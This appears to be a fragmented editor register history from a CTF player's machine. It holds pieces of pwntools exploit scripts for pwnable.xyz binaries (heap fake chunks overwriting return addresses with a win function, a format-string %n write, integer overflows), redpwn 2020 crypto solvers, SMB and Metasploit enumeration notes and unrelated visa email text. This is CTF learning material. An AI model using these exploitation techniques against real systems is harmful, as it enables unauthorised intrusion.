fb3542df70619faf68c028cad46920cd|file:///home/neo/pwnablexyz/two-targets/exploit.py|57|31|v|python
	& 0xff
ea26aafea48035b080c8bf4e9a279da2|file:///home/neo/pwnablexyz/two-targets/exploit.py|57|5|V|python
	    b = bytes([b])
e1497377d9e805b48219f8081d34f26e|file:///home/neo/pwnablexyz/two-targets/exploit.py|64|1|V|python
	log.info(MAIN_INSTR)
2381a84bb0b97f5fdfe2fd7f70a3d39e|file:///home/neo/pwnablexyz/two-targets/exploit.py|59|24|v|python
	 ^ TARGET[i
cd658e429d2fe4053248cf6ba15fa77e|file:///home/neo/pwnablexyz/two-targets/exploit.py|60|19|v|python
	)((c >> 4) | (c << 4)) & 0xff
c9c27679712db1ccf21c36adec17df45|file:///home/neo/pwnablexyz/two-targets/exploit.py|66|10|V|python
	log.info(payload)
	log.info(p2)
34d730321c576ada702c4754866e70dc|file:///home/neo/pwnablexyz/two-targets/exploit.py|57|24|v|python
	 ^ TARGET[i]
2d8d3fab2d3017325149072afd156044|file:///home/neo/pwnablexyz/two-targets/exploit.py|67|1|V|python
	log.info(test)
	log.info(TARGET)
336a9b81aec6faadef9aba3bc0efd939|file:///home/neo/pwnablexyz/two-targets/exploit.py|62|1|V|python
	
	test = b''
	for i,c in enumerate(payload):
	    test += bytes([MAIN_INSTR[i] ^ (((c >> 4) | (c << 4)) & 0xff)])
c2e0e57317ea77e285490a0468f930e8|file:///home/neo/pwnablexyz/two-targets/exploit.py|59|1|V|python
	p2 = b''
	for c in payload:
	    p2 += bytes([((c >> 4) | (c << 4)) & 0xff])
	
f7550675870663324d3a8ace873c395c|file:///home/neo/pwnablexyz/two-targets/exploit.py|60|1|V|python
	log.info(TARGET)
2933beb114de17e4797ee3c5e38662d2|file:///home/neo/pwnablexyz/two-targets/exploit.py|63|1|V|python
	io.recvuntil('> ')
	io.sendline('2')
	io.recvuntil(': ')
	io.sendline(payload)
545b21dd6ed7f9f3c3c7504db12bbe11|file:///home/neo/pwnablexyz/two-targets/exploit.py|71|1|V|python
	payload = b''
9a720667c09f026647c5e74c717c93d2|file:///home/neo/pwnablexyz/two-targets/exploit.py|71|5|V|python
	    payload = addr
458b3b6010825ffbdbc4a77a9f10577c|file:///home/neo/pwnablexyz/two-targets/exploit.py|72|1|V|python
	    io.recvuntil('> ')
	    io.sendline('2')
	    io.recvuntil(': ')
0225636b67d41aa33e24b4df19cc6ac7|file:///home/neo/pwnablexyz/freespirit/exploit.py|58|1|V|python
	io.sendline(p64(FAST_SIZE) + p64(malloced))
3c1fa8560f3828c4a995e81c70cf7824|file:///home/neo/pwnablexyz/freespirit/exploit.py|59|13|v|python
	p64(FAST_SIZE) + p64(malloced)
cead112f0933c8f9eb7a2ccc855deafa|file:///home/neo/pwnablexyz/freespirit/exploit.py|59|1|V|python
	io.sendline('aaaaaaabbbbbbb')
a24db4928fe510d243328f5a9b321043|file:///home/neo/pwnablexyz/freespirit/exploit.py|1|1|V|python
	#!/usr/bin/env python
	# -*- coding: utf-8 -*-
	from pwn import *
	
	# Set up pwntools for the correct architecture
	exe = context.binary = ELF('./challenge')
	# context.terminal = ['tmux', 'splitw', '-h']
	context.terminal = ['tmux', 'new-window']
	
	host = args.HOST or 'svc.pwnable.xyz'
	port = int(args.PORT or 30005)
	
	def local(argv=[], *a, **kw):
	    return process([exe.path] + argv, *a, **kw)
	
	def remote(argv=[], *a, **kw):
	    '''Connect to the process on the remote host'''
	    io = connect(host, port)
	    return io
	
	def start(argv=[], *a, **kw):
	    '''Start the exploit against the target.'''
	    if args.REMOTE:
	        return remote(argv, *a, **kw)
	    else:
	        if args.PWNDBG:
	            gs = '''
	            init-pwndbg
	            '''
	            return gdb.debug(exe.path, gs)
	        elif args.GEF:
	            gs = '''
	            init-gef
	            '''
	            return gdb.debug(exe.path, gs)
	        else:
	            return local(argv, *a, **kw)
	
	def log_addr(name, addr):
	    log.info('{}: {:#x}'.format(name, addr))
	
	#===========================================================
	#                    EXPLOIT GOES HERE
	#===========================================================
	
	WIND_ADDR = exe.sym.win
	FAST_SIZE = 0x40
	
	io = start()
	
	io.recvuntil('> ')
	io.sendline('2')
	malloced = int(io.recvline(),16) 
	log_addr('Malloced pointer at', malloced)
	
	io.recvuntil('> ')
	io.sendline('1')
	# io.sendline(p64(FAST_SIZE) + p64(malloced))
	
	io.recvuntil('> ')
	io.sendline('2')
	
	io.interactive()
	
e0feffe1a5cefe3121fb9ff4ba37f73d|file:///home/neo/pwnablexyz/freespirit/exploit.py|29|13|V|python
	            b *0x000000000040089f
04b97632e21450784d97fa7d286cea6b|file:///home/neo/pwnablexyz/freespirit/exploit.py|62|1|V|python
	io.recvuntil('> ')
	io.sendline('0')
08dd518c23657a87cc2c86196ace02a7|file:///home/neo/pwnablexyz/freespirit/exploit.py|65|17|v|python
	FAST_SIZE
99e4a6f36a090623252b6ba9958b879f|file:///home/neo/pwnablexyz/freespirit/exploit.py|65|1|V|python
	io.sendline(p64(malloced) + p64(malloced))
d2bb1978c1f958b92adfbcc7f744f207|file:///home/neo/pwnablexyz/freespirit/exploit.py|65|34|v|python
	malloced
e49c18adf4d74fe3858291fbb660ce45|file:///home/neo/pwnablexyz/freespirit/exploit.py|65|1|V|python
	io.sendline(p64(FAST_SIZE) + p64(malloced + MAIN_RET_OFFSET - 0x8) + p64(WIN_ADDR))
b41a4675cc51b6184d9e53f695894e3b|file:///home/neo/pwnablexyz/freespirit/exploit.py|33|1|V|python
	            b *0x0000000000400830
71673d244865f9065b5ef5e2650c2305|file:///home/neo/pwnablexyz/freespirit/exploit.py|65|1|V|python
	io.sendline(p64(malloced + MAIN_RET_OFFSET - 0x8) + p64(malloced) + p64(WIN_ADDR))
ddf7562da812b1d141863475c0ec8709|file:///home/neo/pwnablexyz/freespirit/exploit.py|63|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
	io.sendline(p64(malloced + MAIN_RET_OFFSET - 0x8) + p64(malloced) + p64(WIN_ADDR))
	
	io.recvuntil('> ')
	io.sendline('3')
c79687fe8ab258a97cd1975d7e1c81e5|file:///home/neo/pwnablexyz/freespirit/exploit.py|66|13|v|python
	p64(malloced + MAIN_RET_OFFSET - 0x8) + p64(malloced) + p64(WIN_ADDR)
0dd2e1d6f4c9aa13c0dae36cbc9694e2|file:///home/neo/pwnablexyz/freespirit/exploit.py|75|1|V|python
	
	io.recvuntil('> ')
	io.sendline('3')
e0ed71e367767c1a8441feea537e9599|file:///home/neo/pwnablexyz/freespirit/exploit.py|66|17|v|python
	CHUNK_SIZE
1c7302d8b34e3b58db598a84dc5faa6c|file:///tmp/neomutt-neo-1000-2707-689330510050810553|4|77|^v|mail
	 Archive            ‚îÇ        
2a40e668a85d8f085b7763b4619a18ed|file:///home/neo/pwnablexyz/freespirit/exploit.py|71|15|v|python
	new buffer here and
5048e59ce21c6232a5c4ada82c59aeb4|file:///home/neo/pwnablexyz/tlsv00/exploit.py|60|1|V|python
	io.recvuntil('> ')
	io.sendline('2')
	malloced = int(io.recvline(),16) 
	log_addr('Malloced pointer at', malloced)
	
	# Change buffer where read will write to to point to main ret address
	io.recvuntil('> ')
	io.sendline('1')
	io.sendline(b'a' * 8 + p64(malloced + MAIN_RET_OFFSET - 0x10))
	
	io.recvuntil('> ')
	io.sendline('3')
	
	# Construct a fake chunk that will be copied back on the stack 
	# write win address at main ret address location
	# add one extra ret to align stack
	io.recvuntil('> ')
	io.sendline('1')
	io.send(p64(CHUNK_SIZE) + p64(malloced) + p64(RET) + p64(WIN_ADDR)) # use send instead of sendline here because read only reads 32 bytes and the newline will be read by next send
	
	io.recvuntil('> ')
	io.sendline('3')
	
	io.recvuntil('> ')
	io.sendline('0')
698c5ee700751a7502a62ee31103872f|file:///home/neo/pwnablexyz/tlsv00/exploit.py|51|1|V|python
	
	WIN_ADDR = exe.sym.win
	CHUNK_SIZE = 0x51
	MAIN_RET_OFFSET = 0x58
	rop = ROP(exe)
	RET = rop.find_gadget(["ret"]).address
387232afc35ab5b3e721385cfb1d08e9|file:///home/neo/pwnablexyz/tlsv00/exploit.py|29|1|V|python
	            b main
	            b *0x0000000000400877
	            b *0x000000000040089f
	            b *0x0000000000400842
	            b *0x0000000000400830
f0bf5c54ac62bf541887f282bdd30c78|file:///home/neo/pwnablexyz/tlsv00/exploit.py|48|1|V|python
	io.sendlineafter('> ', '2') # load flag
477582bcc3cd1b8953a091dc32ff53fb|file:///home/neo/pwnablexyz/tlsv00/exploit.py|49|1|V|python
	io.sendlineafter('> ', '3') # call print_flag 
968ceca74b623570e169313223931eaf|file:///home/neo/pwnablexyz/tlsv00/exploit.py|57|1|V|python
	    io.sendlineafter('> ', '2') # change key len
517747c1b0e905cb460258d4b73148c8|file:///home/neo/pwnablexyz/tlsv00/exploit.py|54|1|V|python
	io.sendlineafter('> ', '1') # change key len
158e3d798219a5ecd463141bc5ab89db|file:///home/neo/pwnablexyz/tlsv00/exploit.py|55|1|V|python
	io.sendlineafter(': ', '64') # change key len
dd2b91d3dfe71b2c500e86f5a7d84ef3|file:///home/neo/pwnablexyz/tlsv00/exploit.py|59|1|V|python
	    io.sendlineafter('> ', '1') # change key len
3254b571e7c0c4aa7c3d35dc88f9bc5f|file:///home/neo/pwnablexyz/tlsv00/exploit.py|50|1|V|python
	io.sendlineafter('? ', 'y') # populate do_comment buffer with f_do_comment address
c9727b1848ecdce90d66c86c987f07c5|file:///home/neo/pwnablexyz/tlsv00/exploit.py|62|35|v|python
	populate do_comment buffer with f_do_comment address
1e0a507b133b0f85561fc7fc0575eec9|file:///home/neo/pwnablexyz/tlsv00/exploit.py|62|1|V|python
	    line = io.recvline()
	    log.info("Received: %s", line)
d6e9c651e34f424ba9478aa8ffa22794|file:///home/neo/pwnablexyz/tlsv00/exploit.py|48|1|V|python
	io.sendlineafter('> ', '3') # call print_flag 
	io.sendlineafter('? ', 'y') # populate do_comment buffer with f_do_comment address
d7492a91e622b9a85d30faf2f74d7287|file:///home/neo/pwnablexyz/tlsv00/exploit.py|64|44|V|python
	io.sendlineafter('> ', '3') # call print_flag 
	io.sendlineafter('? ', 'n') # don't change do
da1090b07dbdeb66096f1c44e19aaeca|file:///home/neo/pwnablexyz/tlsv00/exploit.py|60|1|V|python
	    # io.sendlineafter('> ', '3') # call print_flag
	    # io.sendlineafter('? ', 'n') # don't change do_comment buffer 
7ab84c6a6a66b02d7f9409c686b2e7d4|file:///home/neo/pwnablexyz/tlsv00/exploit.py|73|1|V|python
	line = io.recvline()
	log.info(line)
57bcdea2dd23ea1fd951a4fe53c43e78|file:///home/neo/pwnablexyz/jmptable/exploit.py|48|1|V|python
	io.recvuntil('> ')
	io.sendline('3') # call print_flag 
	io.recvuntil('? ')
	io.sendline('y') # populate do_comment buffer with f_do_comment address
	
	# First time will put a null byte after key buffer, overwriting the last byte of do_comment buffer
	# do_comment will now point at real_print_flag address
	io.recvuntil('> ')
	io.sendline('1') # change key len
	io.recvuntil(': ')
	io.sendline('64') # change key len
	# For each iteration, reduce key len by one to write a null byte at the last position of the key and get 
	# the last byte of the flag
	for key_len in range(63, 1, -1):
	    log.info('Iteration: %d' % key_len)
	    io.recvuntil('> ')
	    io.sendline('1') # change key len
	    io.recvuntil(': ')
	    io.sendline(str(key_len)) # change key len
	
	io.recvuntil('> ') 
	io.sendline('2') # load flag, key will be nulls
	io.recvuntil('> ')
	io.sendline('3') # call print_flag
	io.recvuntil('? ')
	io.sendline('n') # don't change do_comment buffer 
	line = io.recvline()
	log.info(line)
	line = io.recvline()
	log.info(line)
	
72ccde4b0da1f856dc3e30b98bf235cc|file:///home/neo/pwnablexyz/jmptable/exploit.py|52|1|V|python
	EXIT_ADDR = exe.got['exit']
d4a108499de62dfbc4eea5a5aa83bb10|file:///home/neo/pwnablexyz/jmptable/exploit.py|53|18|v|python
	EXIT_ADDR
f24f62eeb789199b9b2e467df3b1876b|file:///home/neo/pwnablexyz/jmptable/exploit.py|53|11|v|python
	exit
dca281ab3dc1432362393f8e06d9f185|file:///home/neo/pwnablexyz/jmptable/exploit.py|53|1|V|python
	log_addr('cat', CAT_FLAG_ADDR)
49ddf6ef027b456cab44439c18054d9a|file:///home/neo/pwnablexyz/jmptable/exploit.py|54|1|V|python
	io.sendlineafter('> ', 1)
2890f36508ecf4824a3226b59cf80d55|file:///home/neo/vimwiki/Enumeration%20%26%20Foothold.wiki|25|19|v|vimwiki
	 with msfvenom 
23fb729799aa4c5f01feda25a3170c26|file:///home/neo/pwnablexyz/l33tness/exploit.py|54|1|V|python
	io.sendlineafter('> ', '1')
	io.sendlineafter(': ', str(CAT_FLAG_ADDR))
	io.sendlineafter('> ', '-2')
	
	flag = io.recvline()
	log.info(flag)
5c12073f776370be1c8324e516be392f|file:///home/neo/pwnablexyz/l33tness/exploit.py|52|1|V|python
	CAT_FLAG_ADDR = exe.sym['_']
29a7fcf3f34f23e6626280c8830e4efb|file:///home/neo/pwnablexyz/l33tness/exploit.py|29|1|V|python
	            b do_exit
	            b do_read
	            b do_write
	            b do_malloc
	            b do_free
2c5969bb2644e9e0f82dfef3d53104db|file:///home/neo/pwnablexyz/l33tness/exploit.py|50|1|V|python
	io.sendlineafter('x: ', '\x00-100')
5b26f931bfe9a1bcffce071f32fafba5|file:///home/neo/pwnablexyz/l33tness/exploit.py|30|13|V|python
	            piebase 0xbea
e92f2df1b49feeb9588f415dd7883912|file:///home/neo/pwnablexyz/l33tness/exploit.py|59|33|v|python
	 + (
345cd77f7d1c585adc6bf31f741e399e|file:///home/neo/pwnablexyz/l33tness/exploit.py|59|33|v|python
	0x53a//2
0fc10a061a2f7bb0e478324da70be1ee|file:///home/neo/pwnablexyz/l33tness/exploit.py|64|1|V|python
	payload = ('1')
dccfc6dc281b0ad2e2ba989715be338b|file:///home/neo/pwnablexyz/l33tness/exploit.py|67|1|V|python
	payload += (' ')
	payload += ('1')
83ac31963cc2f1936e768cc7ec0e89b8|file:///tmp/neomutt-neo-1000-15159-17156274713642995763|2|1|V|mail
	> The State Department team is seeking ways to ensure‚ÄØthat‚ÄØaspiring and returning students will receive priority attention once routine visa operations can resume.  Embassy Nicosia will publicize any announcement on the resumption of student visa interviews once information is available.
	> 
	> Routine visa services have been suspended worldwide.  In Nicosia, all July visa appointments have been cancelled.  At this very moment, we have visa appointments available from 01 August 2020, but that could change at any time and we might be required to canceling August visa appointments as well.  Our north office is closed indefinitely.  Contact the Call Center and try to reschedule to an August appointment.
	> 
	> The MRV fee is valid and may be used for a visa application in the country where it was purchased within one year of the date of payment. If you have an urgent matter and need to travel immediately, please follow the guidance provided at the Official U.S. Department of State Visa Appointment Service to request an urgent appointment.  Please see these notices which contain detailed information about the current status of visa services worldwide and visa restrictions related to the COVID-19 global pandemic:
b14f088e42f1d5f6194dce27fa2c0a4b|file:///tmp/neomutt-neo-1000-15159-17156274713642995763|2|1|V|mail
	> The State Department team is seeking ways to ensure‚ÄØthat‚ÄØaspiring and returning students will receive priority attention once routine visa operations can resume.  Embassy Nicosia will publicize any announcement on the resumption of student visa interviews once information is available.
	> 
c2d2b7c70fab1cac355f51a2621528d9|file:///tmp/neomutt-neo-1000-15159-9701678042586345529|1|1|V|mail
	The State Department team is seeking ways to ensure‚ÄØthat‚ÄØaspiring and returning students will receive priority attention once routine visa operations can resume.  Embassy Nicosia will publicize any announcement on the resumption of student visa interviews once information is available.
	
	Routine visa services have been suspended worldwide.  In Nicosia, all July visa appointments have been cancelled.  At this very moment, we have visa appointments available from 01 August 2020, but that could change at any time and we might be required to canceling August visa appointments as well.  Our north office is closed indefinitely.  Contact the Call Center and try to reschedule to an August appointment.
	
	The MRV fee is valid and may be used for a visa application in the country where it was purchased within one year of the date of payment. If you have an urgent matter and need to travel immediately, please follow the guidance provided at the Official U.S. Department of State Visa Appointment Service to request an urgent appointment.  Please see these notices which contain detailed information about the current status of visa services worldwide and visa restrictions related to the COVID-19 global pandemic:
db46811cf27a1ca18f6704b79b0f0c5d|file:///home/neo/pwnablexyz/game/exploit.py|29|13|V|python
	            b round_3
247c5c0f8f68508fd2e0c37e11cd70a4|file:///home/neo/pwnablexyz/game/exploit.py|51|1|V|python
	# Round 1
	# Can't give '-' sign, so we give max int(+) to overflow
	io.sendlineafter('x: ', str(MAX_INT + 0x53a))
	io.sendlineafter('y: ', str(MAX_INT + 1))
	
	# Round 2
	# Again, overflow max int
	io.recvuntil('=== t00leet ===')
	io.sendline(str(MAX_INT) + " " + str(MAX_INT - 0x538))
	
	# Round 3 lol
	io.recvuntil("=== 3leet ===")
	payload = ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	payload += (' ')
	payload += ('0')
	io.sendline(payload)
	
838bead03d032d3067ad0b50d534e918|file:///home/neo/pwnablexyz/game/exploit.py|47|1|V|python
	WIN_ADDR_OFFSET = exe.sym.win
	MAX_INT = 0x7fffffff
3874a39e33fdb3dd6874464e7c2577b3|file:///home/neo/pwnablexyz/game/exploit.py|50|1|V|python
	io.sendlineafter('> ', '1')
	io.sendlineafter('= ', '0')
e54d30ab4f63cba38ff43060f729ecd5|file:///home/neo/pwnablexyz/game/exploit.py|55|1|V|python
	io.sendlineafter('= ', '0')
93a30a31ebca2e1a759ead5dd46a0d84|file:///home/neo/pwnablexyz/game/exploit.py|54|1|V|python
	io.sendlineafter('> ', '2')
4b37841d40a8ea030235a11eb0ffcfb3|file:///home/neo/pwnablexyz/game/exploit.py|57|1|V|python
	io.sendlineafter('> ', '3')
313eddd2d849ccc538384cba7413f3dc|file:///home/neo/pwnablexyz/game/exploit.py|51|1|V|python
	io.sendlineafter('> ', '1')
4a2e1ae94a26fdecc0a41c6fe151a501|file:///home/neo/pwnablexyz/game/exploit.py|55|1|V|python
	# Save game to extend cur+0x10 to 0xffffffff
016b1af8f8cb5c809b19a89db0fce377|file:///home/neo/vimwiki/Windows.wiki|41|1|V|vimwiki
	
	== SMB ==
	    * Scan with `enum4linux -A ip`
	    * Commands:
	        * Download file locally: `get filename`
	    * Possible attack vectors:
	        * [ https://www.cvedetails.com/cve/CVE-2017-7494/ ]
	        * Anonymous share access: `smbclient //ip/share (-U user -P port)`
011db853e204cc312ec528a09e8fae0e|file:///home/neo/vimwiki/Metasploit.wiki|2|38|V|vimwiki
	    * Initialize database: `msfdb init`
	
8017e4898983cc208dd3cf739bb4ea10|file:///home/neo/pwnablexyz/fspoo/exploit.py|29|13|V|python
	            b edit_name
af638072da556c1b39516cc274cd89dd|file:///home/neo/pwnablexyz/fspoo/exploit.py|49|1|V|python
	io.sendlineafter(': ', b'a'*15)
	# Play game and give wrong answer to put -1 (0xffff) at cur + 0x10
	io.sendlineafter('> ', '1')
	io.sendlineafter('= ', '0')
	
	# Code casts short to int, score will extend 
	# from 0xffff to 0xffffffff
	io.sendlineafter('> ', '2')
	
	# Call edit name to overwrite address of play_game
	# Send only the 3 address bytes cause buffer is 27 bytes big
	io.sendlineafter('> ', '3')
	io.send(b'a'*24 + p64(WIN_ADDR)[:3])
	
	# Call play_game again to call win
	io.sendlineafter('> ', '1')
	
ec83c6ff294f6f7b04fe97a3c5bd438d|file:///home/neo/pwnablexyz/fspoo/exploit.py|47|1|V|python
	WIN_ADDR = exe.sym.win
3d725dbdf9566e79d5bfa12e25a4ce92|file:///home/neo/pwnablexyz/fspoo/exploit.py|49|1|V|python
	log_addr('win', WIN_ADDR)
1b10941ec334ea2be793456f0d6fd736|file:///home/neo/pwnablexyz/fspoo/exploit.py|56|1|V|python
	log.info(cmd_addr)
19d4e6f0019ab95aaeaa4bb544c233cb|file:///home/neo/pwnablexyz/fspoo/exploit.py|52|1|V|python
	io.recvuntil('Name: ')
650f5e6bb92c9943656903ea79b9e16c|file:///home/neo/pwnablexyz/fspoo/exploit.py|29|13|V|python
	            piebase vuln
750662e0120504f0131e6fc685ecf822|file:///home/neo/pwnablexyz/fspoo/exploit.py|68|1|V|python
	io.sendline(b'a' * OFFSET + p32(cmd_addr - 16) + b"%5$n")
4c3a7d1673185d78030d7f13c50a094c|file:///home/neo/pwnablexyz/fspoo/exploit.py|68|1|V|python
	# io.sendline(b'a' * OFFSET + p32(cmd_addr - 16) + b"%5$n")
2db284d80872e544f7c44762b46f6d7b|file:///home/neo/pwnablexyz/fspoo/exploit.py|66|1|V|python
	# io.sendlineafter('> ', '1')
8d3256fdaa8f4a13c7363fe562581854|file:///home/neo/pwnablexyz/fspoo/exploit.py|65|1|V|python
	io.sendlineafter('> ', '0')
e3434be06f5b586b17c731e514b408d2|file:///home/neo/pwnablexyz/fspoo/exploit.py|71|1|V|python
	# io.sendlineafter('> ', '3')
fbd5620bad24916b341551dc35930ef1|file:///home/neo/pwnablexyz/fspoo/exploit.py|64|1|V|python
	# io.sendlineafter('> ', '0')
4d20d636f58e5189365071add00b6091|file:///home/neo/tryhackme/python/solve.py|6|1|V|python
	for i in range(5):
	    data = b64decode(data)
938a51af531acdb9d6d9e850815cd6f0|file:///home/neo/tryhackme/python/solve.py|9|1|V|python
	for i in range(5):
	    data = b32decode(data)
e18ddebc315e81ab1ef48c25ee37d764|file:///home/neo/tryhackme/python/solve.py|10|1|V|python
	for i in range(5):
	    data = b16decode(data)
c4bdcc3b4f8b586a869ad7daece1c994|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|8|1|V|python
	def encrypt(ptxt, key):
	    ptxt = ptxt.lower()
	    key = ''.join(key[i % len(key)] for i in range(len(ptxt))).lower()
	    ctxt = ''
	    for i in range(len(ptxt)):
	        if ptxt[i] == '_':
	            ctxt += '_'
	            continue
	        x = chr_to_num[ptxt[i]]
	        y = chr_to_num[key[i]]
	        ctxt += num_to_chr[(x + y) % 26]
	    return ctxt
31dad98575d1dd22cdd1f1285c6a2904|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|22|5|V|python
	    ptxt = ptxt.lower()
7ffd5f7d77221fa563a722b951392766|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|29|9|V|python
	        x = chr_to_num[ptxt[i]]
16e8ed259edcc11916cfdb51d27d6b1a|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|28|9|V|python
	        x = num_to_chr[ctxt[i]]
b9b815a9ba2e4fe1d2596480a08307d9|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|42|25|V|python
	print('Ciphertext:',ctxt)
	print('Pseudo-key:',pseudo_key)
1c4772d5ea8da12db4e6e19e18a7c421|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|31|1|V|python
	        ptxt += num_to_chr[(x + 26) // 2]
966435c283cc3fb224e8ddd15dea36d5|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|44|8|v|python
	iigesssaemk
2e3c3ec773ba7d3e528dfbfb4ef62349|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|24|5|V|python
	    ptxt2 = ''
2988cf90d820edd336e5fca541d86c3c|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|47|1|V|python
	key, key2 = decrypt_key(key, key)
78f825aaa0103319aaa1a30bf4fe3ada|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|50|7|v|python
	key2
d590e27dd441e09902edd03644c84701|file:///home/neo/CTFs/redpwn2020/pseudo-key/pseudo-key.py|27|1|V|python
	            ptxt += '_'
a8198b27b716b8ed1e62e44cf2890aa7|file:///home/neo/CTFs/redpwn2020/rsa4k/4k-rsa-public-key.txt|1|4|v|text
	
c062acdac0c578f6ac5432734bfb2c84|file:///home/neo/CTFs/redpwn2020/rsa4k/4k-rsa-public-key.txt|3|4|v|text
	
2375201e23292e51164a2a31e1cfff5c|file:///home/neo/CTFs/redpwn2020/seekrypt/output|1|137875|v|
	136437248584749771882310599149278388531535057166399265926387706469408766646754256272579824944594286947565201090386154252642859489386692473805411897253949013507330688499956189228793511815053892879974238599863038816313198964134947169977378713887483007849103288310288698573564963610808423262228756458677190730145 
fc77726ece2e961261b10a739890f401|file:///home/neo/CTFs/redpwn2020/seekrypt/output|1|137875|v|
	15208002172852064705513549049156125156229213752159018163825621612365155017442357321243997240694068589814280403280924059115680689958405528673283969584726875025903837971544565855345730100919461985993701827484692130096087415066915297046298354141978649627535608324891962634115164448150854962245168416609362554295547467846154568712738134639516660184864893586000423886731114509172379025554849606702807764604046562890333894888196970691461892191718079065215120535321387122435702257687877333759869565354852332910433540118176537491958544695956496612702255403127864825597702515541366203734967406176296928067151309367243599261047
4978520ac23eed2547e9987b8b432c65|file:///home/neo/CTFs/redpwn2020/seekrypt/chall.py|37|1|V|python
	enc 
bdf7d2ee88f0257a8ef02618a985b281|file:///home/neo/CTFs/redpwn2020/seekrypt/chall.py|39|13|V|python
	for c in enc:
	    print(c)
ad940a340456bdd7fcd20799d4e46d41|file:///home/neo/CTFs/redpwn2020/seekrypt/chall.py|35|1|V|python
	n = 15208002172852064705513549049156125156229213752159018163825621612365155017442357321243997240694068589814280403280924059115680689958405528673283969584726875025903837971544565855345730100919461985993701827484692130096087415066915297046298354141978649627535608324891962634115164448150854962245168416609362554295547467846154568712738134639516660184864893586000423886731114509172379025554849606702807764604046562890333894888196970691461892191718079065215120535321387122435702257687877333759869565354852332910433540118176537491958544695956496612702255403127864825597702515541366203734967406176296928067151309367243599261047
50082885f1b1ae65fcd14c676557cd8b|file:///home/neo/CTFs/redpwn2020/primmity/primimity-public-key.txt|1|4|v|text
	
06b63c8e26178a050f9a6ccb57814f15|file:///home/neo/CTFs/redpwn2020/primmity/primimity.py|3|1|V|python
	from Crypto.Util.number import getRandomNBitInteger, isPrime
6cb26eda499016647bc493a6cede2456|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|2|1|V|python
	encrypted = f.readlines().strip()
82d3a7349dc2f99356071d77a2f38a3b|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|2|26|v|python
	.strip()
0048737ec50c9209a260b7d77fcc8b87|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|3|1|V|python
	for e in encrypted
49a068df4e4d21fbca71a5fc6ee0dadb|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|2|16|v|python
	.splitlines()
5f450a49a2b2b99e593bbd70452f6bf9|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|5|1|V|python
	print(encrypted)
d18cbcf793a6e41c0bb1576375ca3a73|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|5|1|V|python
	print(len(encrypted))
fb021defa8910bc897a71f02cd76f058|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|7|9|V|python
	        c = encrypted
38cd5e350907beb514d84d33d2a1c820|file:///home/neo/CTFs/redpwn2020/alienv2/solve.py|5|12|v|python
	nge(len(encrypted)):
7397af04236d19977c80ef2ff65f0ede|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/itsy-bitsy.py|3|1|V|python
	from Crypto.Random.random import randint
fffcf38c955161acd027125e7bd9a2c0|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|5|1|V|python
	r.recvuntil('that i > 0: ')
7585ee4b1d0b21ca4b5fe817c1967245|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|11|1|V|python
	log.info(ct)
81f5ad5066dd36b1df30e6da8051c912|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|3|1|V|python
	r = remote('2020.redpwnc.tf', 31284)
	r.recvuntil('that i > 0: ')
	r.sendline('1')
	r.recvuntil('that j > i > 0: ')
	r.sendline('2')
	r.recvuntil('Ciphertext: ')
	ct = r.recvline().strip()
84e2eebfb916208b966c053dccd29b4b|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|12|1|V|python
	i = 2**(ct_len+1)
7e9f6972730501c9c5d05ba59841463e|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|2|1|V|python
	
	r = remote('2020.redpwnc.tf', 31284)
	r.recvuntil('that i > 0: ')
	r.sendline('1')
	r.recvuntil('that j > i > 0: ')
	r.sendline('2')
	r.recvuntil('Ciphertext: ')
	ct = r.recvline().strip()
	
5bb4d65bb4beca8bec941a20e8f90c74|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|4|1|V|python
	log.info(ct_len)
35eb5a80da8a1d407ae1154687a0a2c2|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|17|13|v|python
	range(len(ct))
e6cfdb6f4762e68b3f66f5173a4957c7|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/solve.py|19|1|V|python
	        if c == b'1':
	            pt += b'1'
	        else: 
	            pt += b'0'
2efecac03742b74bff0cb1e271e85181|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/itsy-bitsy.py|5|1|V|python
	def str_to_bits(s):
	    bit_str = ''
	    for c in s:
	        i = ord(c)
	        bit_str += bin(i)[2:]
	    return bit_str
e1909522bf195d60d864c2ef67ede761|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/itsy-bitsy.py|45|18|v|python
	in range(2**6,2**7)
58cf84bef0ea1da9b44dfabe172facc3|file:///home/neo/CTFs/redpwn2020/itsy-bitsy/itsy-bitsy.py|25|1|V|python
	def generate_random_bits(lower_bound, upper_bound, number_of_bits):
	    bit_str = ''
	    while len(bit_str) < number_of_bits:
	        r = randint(lower_bound, upper_bound)
	        bit_str += bin(r)[2:]
	    return bit_str[:number_of_bits]
	
	def bit_str_xor(bit_str_1, bit_str_2):
	    xor_res = ''
	    for i in range(len(bit_str_1)):
	        bit_1 = bit_str_1[i]
	        bit_2 = bit_str_2[i]
	        xor_res += str(int(bit_1) ^ int(bit_2))
	    return xor_res
